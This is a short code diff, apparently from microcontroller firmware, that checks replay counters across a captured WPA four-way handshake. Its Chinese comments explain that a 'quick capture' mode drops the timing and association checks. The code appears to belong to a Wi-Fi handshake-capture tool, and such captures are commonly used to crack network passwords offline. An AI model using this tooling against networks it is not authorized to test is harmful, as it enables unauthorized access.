+  if (!rcEquals(rcM1, rcM2)) {
+    if (g_verboseHandshakeLog) Serial.println(F("[QuickCapture-CHK-FAIL] rc(M1) != rc(M2)"));
+    return false;
+  }
+  // 某些AP实现不会在M3/M4对回放计数严格+1，而是保持与M1/M2相同或+1
+  bool m3Ok = rcEquals(rcM3, rcM1) || rcIsPlusOne(rcM3, rcM1);
+  bool m4Ok = rcEquals(rcM4, rcM2) || rcIsPlusOne(rcM4, rcM1);
+  if (!m3Ok) { if (g_verboseHandshakeLog) Serial.println(F("[QuickCapture-CHK-FAIL] rc(M3) not equal to M1 or M1+1")); return false; }
+  if (!m4Ok) { if (g_verboseHandshakeLog) Serial.println(F("[QuickCapture-CHK-FAIL] rc(M4) not equal to M2 or M1+1")); return false; }
+  if (g_verboseHandshakeLog) Serial.println(F("[QuickCapture-CHK] Replay counters pattern OK"));
+  
+  // 快速抓包模式：移除时间窗口限制，只要有有效的握手包就认为成功
+  // 不再要求近时的 Auth/Assoc 佐证，因为快速抓包可能在不同时间捕获到这些帧
+  
+  if (g_verboseHandshakeLog) Serial.println(F("[QuickCapture-CHK] Handshake validation passed"));
   return true;
 }
 
